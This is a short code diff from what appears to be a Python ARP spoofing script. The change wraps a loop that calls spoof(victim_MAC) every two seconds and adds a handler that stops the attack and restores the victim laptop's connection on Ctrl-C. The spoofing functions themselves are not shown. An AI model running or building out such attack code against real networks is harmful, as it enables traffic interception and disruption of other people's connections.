@@ -25,6 +25,12 @@ def restore(victim_MAC):
     send(packet, count=5, verbose=False)
 
 victim_MAC = get_MAC_adress()
-while True:
-    spoof(victim_MAC)
-    time.sleep(2)
+try:
+    while True:
+        spoof(victim_MAC)
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\nStopping attack, restoring laptop's connection...")
+    restore(victim_MAC)
+    print("Done. Laptop reconnected.")
+    
